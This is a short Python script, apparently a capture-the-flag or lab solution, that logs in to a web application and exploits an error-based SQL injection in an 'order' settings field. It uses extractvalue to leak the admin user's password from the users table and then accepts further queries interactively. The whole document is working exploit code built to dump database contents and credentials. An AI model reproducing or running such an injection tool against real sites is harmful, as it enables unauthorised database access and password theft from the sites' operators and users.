import requests

s = requests.Session()

url = "http://gusralph.info:5000/"
data = {
    "name":"morph3",
    "password":"morph3"
}
#r = s.post(url+"register",data=data)
r = s.post(url+"login",data=data)
q = "select password from users where name = 'admin' limit 0,1"
while q != "q":
    data = {
         "order" : "1,extractvalue(0x0a,concat(0x0a,({})))#".format(q)
    }
    r = s.post(url+"settings",data=data)
    r = s.get(url+"profile/1")
    print data
    q = raw_input("~#:")